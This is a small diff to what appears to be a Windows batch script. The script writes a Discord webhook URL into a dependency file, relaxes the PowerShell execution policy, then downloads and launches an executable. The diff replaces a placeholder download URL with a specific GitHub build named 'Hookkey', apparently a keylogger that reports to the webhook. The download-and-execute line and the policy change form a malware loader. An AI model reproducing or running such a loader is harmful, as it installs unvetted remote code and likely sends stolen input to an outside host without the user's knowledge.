@@ -2,4 +2,4 @@
 set "WebHookURL=your_discord_webhook_here"
 mkdir "%USERPROFILE%\Source" 2>nul
 echo %WebHookURL% > "%USERPROFILE%\Source\main.dependency"
-powershell -command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; (iwr 'https://github.com/user/repo/raw/main/file.exe' -OutFile 'main.exe'); Start-Process 'main.exe'"
+powershell -command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; (iwr 'https://github.com/Sabnock-k/Hookkey/raw/refs/heads/main/dist/hookkey.exe' -OutFile 'main.exe'); Start-Process 'main.exe'"
